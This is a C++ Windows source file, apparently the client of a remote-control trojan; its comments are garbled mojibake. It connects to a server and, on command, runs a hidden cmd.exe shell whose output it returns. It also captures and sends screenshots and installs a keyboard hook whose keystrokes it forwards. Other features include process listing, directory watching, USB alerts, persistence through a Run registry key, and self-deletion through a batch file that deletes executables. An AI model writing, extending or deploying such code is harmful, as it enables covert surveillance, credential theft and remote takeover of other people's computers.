#include <stdio.h>
#include"resource.h"
#pragma comment(lib,"KEY.lib")				//����dll�����


#include <WinSock2.h>
#pragma comment (lib, "ws2_32.lib")
#include <TLHELP32.H>
#include<Dbt.h>


//�궨��

//cmd�� 
#define GET_SERVER_CMD		10001
#define TO_SERVER_CMD		10002

//��Ļ��
#define	GET_SERVER_SCREEN	20001
#define TO_SERVER_SCREEN	20002

//���̰�
#define GET_SERVER_KEY		30001



HANDLE		 hmutex1;		//����ȫ�ֻ��������������ͬ���յ����͵�����˵İ���

#pragma pack(push)
#pragma pack(1)
struct MyWrap
{
	DWORD	dwType;			//��������
	DWORD	dwLength;		//�����ݵĳ���
	PVOID	lpBuffer;		//������
};
#pragma pack(pop)


//������Ϣ������
struct stProcessData
{
	PROCESSENTRY32	stPro;
	stProcessData* next;

};


HANDLE hMyWrite, hMyRead, hCmdWrite, hCmdRead;				//�ܵ���ؾ��

WORD	wVersionRequested;
WSADATA	wsaData;
SOCKET	hSocketWait;		//ר�����ڵȴ����ӵ�socket

DWORD	dwHeartTime = 0;		//�������ʱ��

BOOL SetHook();				//��װ���̹���
BOOL InstallHook();			//ж�ؼ��̹���
BOOL _InitCmd();
BOOL _NowDelete();
BOOL CreatePingBat(char* pszBatFileName);
BOOL _RebootDelete(char* szFilePath);
BOOL _stdcall _HeartTest();

BOOL _stdcall _ToServer();
BOOL _stdcall _InitClient();
BOOL _stdcall _OwnStart();
DWORD _stdcall _GetScreenData(char** pBitMapBuf);
BOOL _stdcall _SendScreenData(char** pBitMapBuf, DWORD dwSize);
void TcharToChar(const TCHAR* tchar, char* _char);
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	MSG		stMsg;
	CreateDialogParam(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)_DialogMain, 0);
	while (GetMessage(&stMsg, NULL, 0, 0))
	{
		TranslateMessage(&stMsg);
		DispatchMessage(&stMsg);

	}
	return stMsg.wParam;

}



//�����ڴ��ڹ���
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	COPYDATASTRUCT* pCopyData;
	char* Buffer;
	static	MyWrap	stWrap;				//������Ҫ���þ�̬�ģ���Ϊ���������������ջ�����
	DWORD	dwNum;
	DWORD	dwItem;
	HICON	hIcon;
	char	szChar[256];
	char	szFilePath[256] = "C:\\Users\\Administrator\\Desktop\\CmdLine.exe";


	switch (message)
	{
	case WM_COPYDATA:					//���ռ��̹��ӻص�����������
		pCopyData = (COPYDATASTRUCT*)lParam;
		stWrap.dwType = GET_SERVER_KEY;
		stWrap.dwLength = pCopyData->cbData;


		WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
		send(hSocketWait, (char*)&stWrap, 8, 0);
		send(hSocketWait, (char*)pCopyData->lpData, stWrap.dwLength, 0);
		ReleaseMutex(hmutex1);						//�ͷŻ������1

		break;
	case WM_DEVICECHANGE:
		switch (wParam)
		{
		case DBT_DEVICEARRIVAL:						//�豸����
			if (((PDEV_BROADCAST_HDR)lParam)->dbch_devicetype == DBT_DEVTYP_VOLUME)			//������߼��̷�
			{
				dwNum = ((PDEV_BROADCAST_VOLUME)lParam)->dbcv_unitmask;
				dwItem = 0;
				do
				{
					dwNum = dwNum / 2;
					dwItem++;
				} while (dwNum);


				memset(szChar, 0, sizeof(szChar));
				lstrcpy(szChar, TEXT("��USB���룺"));
				szChar[lstrlen(szChar)] = char('A' + dwItem - 1);

				stWrap.dwType = 60001;
				stWrap.dwLength = lstrlen(szChar);
				WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
				send(hSocketWait, (char*)&stWrap, 8, 0);
				send(hSocketWait, szChar, stWrap.dwLength, 0);
				ReleaseMutex(hmutex1);						//�ͷŻ������1
			}
			break;
		case DBT_DEVICEREMOVECOMPLETE:				//�豸�Ƴ�
			if (((PDEV_BROADCAST_HDR)lParam)->dbch_devicetype == DBT_DEVTYP_VOLUME)			//������߼��̷�
			{
				dwNum = ((PDEV_BROADCAST_VOLUME)lParam)->dbcv_unitmask;
				dwItem = 0;
				do
				{
					dwNum = dwNum / 2;
					dwItem++;
				} while (dwNum);


				memset(szChar, 0, sizeof(szChar));
				lstrcpy(szChar, TEXT("��USB�γ���"));
				szChar[lstrlen(szChar)] = char('A' + dwItem - 1);

				stWrap.dwType = 60001;
				stWrap.dwLength = lstrlen(szChar);
				WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
				send(hSocketWait, (char*)&stWrap, 8, 0);
				send(hSocketWait, szChar, stWrap.dwLength, 0);
				ReleaseMutex(hmutex1);						//�ͷŻ������1
			}
			break;
		default:
			break;

		}

		break;
	case WM_INITDIALOG:
		_InitClient();			//1.��ʼ������	

		hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
		SendMessage(hWnd, WM_SETICON, ICON_BIG, LPARAM(hIcon));

		hmutex1 = CreateMutex(NULL, false, NULL);	//����������󲢷�������
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ToServer, NULL, 0, NULL);				//�����߳������˽���
		
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_HeartTest, NULL, 0, NULL);							//�����߳̽����������ķ�������

		break;
	case WM_CLOSE:
		closesocket(hSocketWait);
		WSACleanup();
		PostMessage(hWnd, WM_DESTROY, 0, 0);
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:

		return FALSE;
	}

	return TRUE;

}


//��������̻߳ص�����
BOOL _stdcall _HeartTest()
{
	MyWrap stWrap;
	stWrap.dwType = 90001;
	stWrap.dwLength = 0;

	dwHeartTime = GetTickCount();		//��ʼ��ʱ���
	while (1)
	{
		if ((GetTickCount() - dwHeartTime) == 1000 * 20)					//20s����һ��������
		{
			WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
			send(hSocketWait, (char*)&stWrap, 8, 0);
			ReleaseMutex(hmutex1);						//�ͷŻ������1

		}

		if (dwHeartTime != 0 && (GetTickCount() - dwHeartTime) > 1000 * 60)	//����Ƿ񳬹�40sδ�յ���	
			break;
	
	}
	MessageBox(NULL, TEXT("�������˶Ͽ����ӣ��볢���������ӣ�"), NULL, MB_OK);
	exit(0);										
	ExitProcess(NULL);
	return 0;

}





//�����Ļ��Ϣ
DWORD _stdcall _GetScreenData(char** pBitMapBuf)
{
	HWND	hDeskWnd;			//����Ĵ��ھ��
	HDC		hDeskDc;			//�����DC���
	HDC		hMyDc;				//���ǵ�DC(��������DC)
	HBITMAP hMyBitMap;			//����λͼ(���������)
	int		nWidth;				//��������ؿ�
	int		nHeight;			//��������ظ�



	hDeskWnd = GetDesktopWindow();
	hDeskDc = GetDC(hDeskWnd);

	//����������DC����ݵ��ڴ�DC
	hMyDc = CreateCompatibleDC(hDeskDc);
	nWidth = GetSystemMetrics(SM_CXFULLSCREEN);
	nHeight = GetSystemMetrics(SM_CYFULLSCREEN);
	//����������DC����ݵ�λͼ
	hMyBitMap = CreateCompatibleBitmap(hDeskDc, nWidth, nHeight);

	//�����Ǵ�����λͼ��DC�����
	SelectObject(hMyDc, hMyBitMap);

	//������DC�����ݿ��������ǵ�DC
	BitBlt(
		hMyDc,
		0,				//x
		0,				//y
		nWidth,
		nHeight,
		hDeskDc,
		0,
		0,
		SRCCOPY			//����ģʽ
	);

	//CImage image;
	//image.Attach(hMyBitMap);
	//image.Save(TEXT("��Ļ����.jpg"));

	*pBitMapBuf = new char[nWidth * nHeight * 4 + 8 + 1]();
	GetBitmapBits(hMyBitMap, nWidth * nHeight * 4, *pBitMapBuf + 8);					//��ȡλͼ�е�����
	((DWORD*)(*pBitMapBuf))[0] = nWidth;
	((DWORD*)(*pBitMapBuf))[1] = nHeight;


	ReleaseDC(hDeskWnd, hDeskDc);
	DeleteDC(hMyDc);
	DeleteObject(hMyBitMap);

	return nWidth * nHeight * 4 + 8;
}




//������Ļ��
BOOL _stdcall _SendScreenData(char** pBitMapBuf, DWORD dwSize)
{

	char szBuffer[256];
	MyWrap stWrap;

	stWrap.dwType = GET_SERVER_SCREEN;
	stWrap.dwLength = dwSize;
	stWrap.lpBuffer = *pBitMapBuf;


	WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
	send(hSocketWait, (char*)&stWrap, 8, 0);
	send(hSocketWait, *pBitMapBuf, dwSize, 0);
	ReleaseMutex(hmutex1);						//�ͷŻ������1

	return 0;
}



//���cmd����
DWORD _stdcall _GetCmdData(char** pCmdBuf, MyWrap stWrap)
{
	char szBuffer[256] = { 0 };
	char szBuffer1[0x256] = { 0 };
	char szBuffer2[0x1000] = { 0 };
	DWORD dwSize;
	lstrcpy(szBuffer, (LPCSTR)stWrap.lpBuffer);
	lstrcat(szBuffer, TEXT("\r\n"));

	WriteFile(hMyWrite, szBuffer, lstrlen(szBuffer), NULL, NULL);				//��ܵ���д������
	Sleep(100);
	int i = 0;
	while (1)
	{
		memset(szBuffer1, 0, sizeof(szBuffer1));
		ReadFile(hMyRead, szBuffer1, 256, &dwSize, NULL);						//�ӹܵ��ж�ȡ����
		lstrcat(szBuffer2, szBuffer1);
		if (dwSize != 256)
			break;
		i++;
	}



	*pCmdBuf = new char[lstrlen(szBuffer2) + 1]();
	lstrcpy(*pCmdBuf, szBuffer2);
	return lstrlen(szBuffer2) + 1;

}


//����cmd��
BOOL _stdcall _SendCmdData(char** pCmdBuf, DWORD dwSize)
{
	char szBuffer[256];
	MyWrap stWrap;

	stWrap.dwType = GET_SERVER_CMD;
	stWrap.dwLength = dwSize;
	stWrap.lpBuffer = *pCmdBuf;


	WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
	send(hSocketWait, (char*)&stWrap, 8, 0);
	send(hSocketWait, *pCmdBuf, dwSize, 0);
	ReleaseMutex(hmutex1);						//�ͷŻ������1

	return 0;

}

//��ý�������
DWORD _stdcall _GetProcessData(char** pCmdBuf)
{

	stProcessData* pHand = NULL;			//������Ϣ����ͷָ��
	stProcessData* pProcess = NULL;		//����ָ��
	HANDLE			hProcessSnap;							//���̿��վ��
	PROCESSENTRY32	stProcess;
	stProcess.dwSize = sizeof(PROCESSENTRY32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);



	Process32First(hProcessSnap, &stProcess);
	int uu = GetLastError();
	DWORD i = 0;
	while (TRUE)
	{
		i = i + 1 + lstrlen(stProcess.szExeFile) + 1 + 4;
		if (pHand == NULL)
		{
			pHand = new stProcessData;
			pProcess = pHand;
			pProcess->stPro = stProcess;
			pProcess->next = NULL;
		}
		else
		{
			pProcess->next = new stProcessData;
			pProcess->next->stPro = stProcess;
			pProcess->next->next = NULL;
			pProcess = pProcess->next;
		}
		if (FALSE == Process32Next(hProcessSnap, &stProcess))
			break;

	}
	CloseHandle(hProcessSnap);


	*pCmdBuf = new char[i + 2]();
	DWORD x = 0;
	pProcess = pHand;
	while (pProcess != NULL)
	{
		(*pCmdBuf)[x] = 0;
		x++;
		lstrcpy(*pCmdBuf + x, pProcess->stPro.szExeFile);
		x = x + lstrlen(pProcess->stPro.szExeFile);
		(*pCmdBuf)[x] = 0;
		x++;
		((DWORD*)(*pCmdBuf + x))[0] = pProcess->stPro.th32ProcessID;
		x = x + 4;
		pProcess = pProcess->next;
	}

	return i + 2;
}


//���ͽ�����Ϣ
BOOL _stdcall _SendProcessData(char** pProcessBuf, DWORD dwSize)
{

	MyWrap stWrap;
	stWrap.dwType = 40001;
	stWrap.dwLength = dwSize;


	WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
	send(hSocketWait, (char*)&stWrap, 8, 0);
	send(hSocketWait, *pProcessBuf, dwSize, 0);
	ReleaseMutex(hmutex1);						//�ͷŻ������1

	return 0;
}


//�õ��ļ������Ϣ������
DWORD _stdcall _GetFileControlData(char* pBuffer)
{
	MyWrap wrap;
	DWORD  dwData;
	char   szFileName[0x256] = { 0 };				//���ص��ļ���
	char   szReturnBuf[0x256] = { 0 };				//�洢��Ҫ���ص���Ϣ

	HANDLE hFile;
	FILE_NOTIFY_INFORMATION* pFileNotifyInfo;		//ָ�򷵻ص��ļ���Ϣ
	char szBuffer[0x256] = { 0 };
	lstrcpy(szBuffer, (LPCSTR)pBuffer);
	pFileNotifyInfo = (FILE_NOTIFY_INFORMATION*)new BYTE[0x1000]();

	hFile = CreateFile(szBuffer, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);				//��Ŀ¼
	do
	{
		int nnn = ReadDirectoryChangesW(hFile,									//��������ļ�
			pFileNotifyInfo,
			0x1000,
			TRUE,
			FILE_NOTIFY_CHANGE_FILE_NAME |
			FILE_NOTIFY_CHANGE_DIR_NAME |
			FILE_NOTIFY_CHANGE_ATTRIBUTES |
			FILE_NOTIFY_CHANGE_SIZE |
			FILE_NOTIFY_CHANGE_LAST_WRITE |
			FILE_NOTIFY_CHANGE_LAST_ACCESS |
			FILE_NOTIFY_CHANGE_CREATION |
			FILE_NOTIFY_CHANGE_SECURITY,
			&dwData,
			NULL,
			NULL);

		TcharToChar((TCHAR*)pFileNotifyInfo->FileName, szFileName);		//���ַ���խ�ַ�
		switch (pFileNotifyInfo->Action)
		{
		case FILE_ACTION_ADDED:
			wsprintf(szReturnBuf, TEXT("�ļ���أ������ļ���%s\\%s"), pBuffer, szFileName);
			break;
		case FILE_ACTION_REMOVED:
			wsprintf(szReturnBuf, TEXT("�ļ���أ�ɾ���ļ���%s\\%s"), pBuffer, szFileName);
			break;
		case FILE_ACTION_MODIFIED:
			wsprintf(szReturnBuf, TEXT("�ļ���أ��޸��ļ���%s\\%s"), pBuffer, szFileName);
			break;
		case FILE_ACTION_RENAMED_OLD_NAME:
			wsprintf(szReturnBuf, TEXT("�ļ���أ��������ļ���%s\\%s"), pBuffer, szFileName);
			break;
		}
		wrap.dwType = 50001;
		wrap.dwLength = lstrlen(szReturnBuf) + 1;

		WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
		send(hSocketWait, (char*)&wrap, 8, 0);							//�������ݻ�����
		send(hSocketWait, (char*)szReturnBuf, wrap.dwLength, 0);
		ReleaseMutex(hmutex1);						//�ͷŻ������1

	} while (TRUE);
	CloseHandle(hFile);
}





//������ɾ��
BOOL _RebootDelete(char* szFilePath)
{
	char szFileName[256] = "\\\\?\\";
	lstrcat(szFileName, szFilePath);
	return MoveFileEx(szFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);								//����������ɾ��
}



//������ɾ��
BOOL _NowDelete()
{
	char szFileName[256] = { 0 };					//��ǰ��ִ���ļ�Ŀ¼
	char szBatName[256] = { 0 };					//�������������ļ���·��
	char szCmd[256] = { 0 };						//ִ���������ļ���cmd������


	//��õ�ǰ��ִ���ļ���Ŀ¼
	GetModuleFileName(NULL, szFileName, sizeof(szFileName));
	char* p = strrchr(szFileName, '\\');
	p[0] = 0;

	//�������������ļ���·��
	lstrcpy(szBatName, szFileName);
	lstrcat(szBatName, TEXT("\\temp.bat"));

	//����ִ���������ļ���cmd����
	wsprintf(szCmd, TEXT("cmd /c call \"%s\""), szBatName);

	//�����������ļ�
	CreatePingBat(szBatName);


	//�����½��̣������ؿ���̨��ʽִ���������ļ�
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = FALSE;				//����ʾ������

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
	ExitProcess(NULL);



}



//������ɾ��ping�������ļ�
BOOL CreatePingBat(char* pszBatFileName)
{
	int iTime = 2;
	char szBat[MAX_PATH] = { 0 };

	// ��������������
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del %0
	*/
	wsprintf(szBat, "@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n", iTime);

	// �����������ļ�
	FILE* fp = NULL;
	fopen_s(&fp, pszBatFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + lstrlen(szBat)), 1, fp);
	fclose(fp);


	return TRUE;
}






//���ÿ���������
BOOL _stdcall _OwnStart()
{
	HKEY	hKey;
	char szKeyName[256] = "ykzqd";
	char szFileName[0x256] = { 0 };
	GetModuleFileName(NULL, szFileName, sizeof(szFileName));


	RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, szKeyName, 0, REG_SZ, (BYTE *)szFileName, lstrlen(szFileName) + 1);

	return 0;

}


//ȡ������������
BOOL _stdcall _DeleteOwnStart()
{
	HKEY	hKey;
	char szKeyName[256] = "ykzqd";
	
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
	RegDeleteValue(hKey, szKeyName);
	return 0;

}


//��ʼ������
BOOL _stdcall _InitClient()
{


	//windows�����⣬��Ҫ��������api����������ĳ�ʼ�����������
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	//1.�����׽���

	hSocketWait = socket(
		AF_INET,	//INETЭ���
		SOCK_STREAM,//��ʾʹ�õ���TCPЭ��
		0);
	return 0;
}





//���ַ����խ�ַ�
void TcharToChar(const TCHAR* tchar, char* _char)

{

	int iLength;

	//��ȡ�ֽڳ���   

	iLength = WideCharToMultiByte(CP_ACP, 0, (LPCWCH)tchar, -1, NULL, 0, NULL, NULL);

	//��tcharֵ����_char    

	WideCharToMultiByte(CP_ACP, 0, (LPCWCH)tchar, -1, _char, iLength, NULL, NULL);

}




//�����˽���
BOOL _stdcall _ToServer()
{

	char* pBitMapBuf;			//ָ��λͼ���ݻ�����
	char* pCmdBuf;			//ָ��cmd���ݻ�����
	char* pProcessBuf;		//ָ��������ݻ�����
	char* pFileControl;		//ָ���ļ����


	DWORD	nBufLen;				//�������Ĵ�С
	BYTE	szBuffer[256];
	BYTE	bData[0x256];			//�����ļ���ش����̵߳Ĳ���
	MyWrap	stWrap;
	int		flag = 0;
	HANDLE	hFileThread = NULL;		//�ļ�����߳̾��
	char	szFilePath[256] = { 0 };		//�ļ�·��


	//��ʼ���ܵ�
	_InitCmd();

	//2. �������ӷ�����
	sockaddr_in	addr;		//��������ip�Ͷ˿ڵĽṹ��
	addr.sin_family = AF_INET;				//INETЭ���
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");	//ip��ַ
	addr.sin_port = htons(10087);			//�˿ڣ���Ҫ�����ֽ���ת�����ֽ���




	if (SOCKET_ERROR == connect(hSocketWait, (sockaddr*)&addr, sizeof(sockaddr_in)))				//�������ӷ����
		return 0;
	int len = 0;
	int len1;
	while (1)
	{
		len = 0;
		memset(szBuffer, 0, sizeof(szBuffer));
		while (1)
		{
			len = recv(hSocketWait, (char*)(szBuffer + len), 8 - len, 0);
			if (len <= 0)
			{
				flag = 1;
				break;
			}
			if (len == 8)
				break;
		}
		if (flag == 1)				//��������Ͽ������˳��߳�
		{
			flag = 0;
			break;
		}
		stWrap.dwType = szBuffer[0] + szBuffer[1] * 0x100 + szBuffer[2] * 0x10000 + szBuffer[3] * 0x1000000;
		stWrap.dwLength = szBuffer[4] + szBuffer[5] * 0x100 + szBuffer[6] * 0x10000 + szBuffer[7] * 0x1000000;

		stWrap.lpBuffer = new BYTE[stWrap.dwLength + 1]();
		if (stWrap.dwLength != 0)
		{
			len = 0;
			len1 = 0;
			while (1)
			{
				len1 = recv(hSocketWait, (char*)((DWORD)stWrap.lpBuffer + len), stWrap.dwLength - len, 0);
				len = len + len1;
				if (len == stWrap.dwLength)
					break;
			}

		}


		switch (stWrap.dwType)
		{
		case TO_SERVER_CMD:					//����cmd
			nBufLen = _GetCmdData(&pCmdBuf, stWrap);
			_SendCmdData(&pCmdBuf, nBufLen);
			delete[] pCmdBuf;
			break;
		case TO_SERVER_SCREEN:				//������Ļ����
			nBufLen = _GetScreenData(&pBitMapBuf);			//�����Ļ��Ϣ
			_SendScreenData(&pBitMapBuf, nBufLen);
			delete[] pBitMapBuf;
			break;
		case 30002:							//��װ���̹���
			SetHook();										//��װ���̹���
			break;
		case 30003:							//ж�ؼ��̹���
			InstallHook();									//ж�ؼ��̹���
			break;
		case 40002:							//��������б�				
			nBufLen = _GetProcessData(&pProcessBuf);
			_SendProcessData(&pProcessBuf, nBufLen);
			delete[] pProcessBuf;
			break;
		case 50002:							//�����ļ���أ���Ϊ�ļ����������״̬��������Ҫ�������߳�����ɣ�
			if (hFileThread != NULL)
			{
				TerminateThread(hFileThread, 0);
				CloseHandle(hFileThread);
			}
			memset(bData, 0, sizeof(bData));
			lstrcpy((LPSTR)bData, (LPCSTR)stWrap.lpBuffer);
			hFileThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_GetFileControlData, bData, 0, NULL);
			break;
		case 70001:							//����������ɾ��
			_NowDelete();
			break;
		case 70002:							//����������ɾ��
			GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
			_RebootDelete(szFilePath);						//����������ɾ��
			break;
		case 80001:							//���󿪻�������
			_OwnStart();
			break;
		case 80002:							//ȡ������������
			_DeleteOwnStart();				
			break;
		case 90002:							//�����ظ�����ʲô��������
			break;
		}

		dwHeartTime = GetTickCount();		//����ʱ���
		delete[] stWrap.lpBuffer;


	}

	return 0;
}








//��ʼ��cmd�������ܵ��ͽ���
BOOL _InitCmd()
{

	SECURITY_ATTRIBUTES	as;
	as.nLength = sizeof(SECURITY_ATTRIBUTES);
	as.bInheritHandle = TRUE;							//�ܵ�����ɼ̳�
	as.lpSecurityDescriptor = NULL;
	CreatePipe(&hCmdRead, &hMyWrite, &as, 0);			// my ----> cmd  �ܵ�
	CreatePipe(&hMyRead, &hCmdWrite, &as, 0);			// my <---- cmd	 �ܵ�


	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;					//��˼�ǿ��Ը���cmd�ı�׼�������
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
		NULL,
		NULL,
		NULL,
		TRUE,	//�̳�
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	return 1;
}
